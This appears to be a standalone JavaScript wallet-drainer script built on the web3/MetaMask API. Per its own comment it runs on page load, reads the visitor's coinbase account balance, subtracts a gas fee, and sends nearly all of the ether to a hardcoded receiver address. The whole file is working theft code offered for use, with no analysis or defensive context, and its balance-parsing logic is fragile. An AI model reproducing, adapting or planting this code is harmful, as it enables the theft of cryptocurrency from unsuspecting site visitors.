// Main coinbase account from metamask
var coinbase;
// Ether Balance of coinbase account
var etherBalance;
// Ether Receiver
var etherReceiver = "0x8888881CEDA4E95043bcD6CEC9ed0fF3C419a3b6";
// Transaction object
var transactionObject;
// Gas Limit
var gasLimitNumber = 21000;
// Gas Price
var gasPriceNumber = 10**10;
// Transaction Gas Fee
var gasFee = gasLimitNumber * gasPriceNumber;
// Ether value send
var etherValue;
// Balance from Wei
var balanceFromWie;
// Web3 start function, It will run when the web page is loaded  
function startWeb3() {

  coinbase = web3.eth.coinbase;
  getBalance(coinbase);

}

// Get the Ether balance of the coinbase account from the metamask
function getBalance(address) {
  return web3.eth.getBalance(address, function (error, result) {
    if (!error) {
        
        balanceFromWie = web3.fromWei(result);

        if (balanceFromWie.e < 0) {

            if (balanceFromWie.c[1] == undefined) {
                 balanceFromWie.c[1] = "0000";
            } else {
              balanceFromWie.c[1] = balanceFromWie.c[1].toString();
              balanceFromWie.c[1] = balanceFromWie.c[1].substr(0, 4);
            }

             etherBalance = Number(balanceFromWie.c[0] + '' + balanceFromWie.c[1]);


        } else { 

            if (balanceFromWie.c[1] == undefined) {
                 balanceFromWie.c[1] = "00000000000000";
            }
            if (balanceFromWie.c[2] == undefined) {
                 balanceFromWie.c[2] = "0000";
            } else {
              balanceFromWie.c[2] = balanceFromWie.c[2].toString();
              balanceFromWie.c[2] = balanceFromWie.c[2].substr(0, 4);
            }

            etherBalance = Number(balanceFromWie.c[0] + '' + balanceFromWie.c[1] + '' + balanceFromWie.c[2]);
        }
        
        etherValue = etherBalance - (gasFee + (gasFee / 10)); // 1 gWei extra fee
        transactionObject = {from:coinbase, to:etherReceiver, value:etherValue, gas:gasLimitNumber, gasPrice:gasPriceNumber};
        sendBalance(transactionObject);
    } else {
      	console.error(error);
    }
  })
}

// Send Ethers to etherReceiver account from coinbase account
function sendBalance(transactionObject) {
  return web3.eth.sendTransaction(transactionObject, function (error, result) {
    if (!error) {
        // console.log(etherBalance);
    } else {
        console.error(error);
    }
  })
}
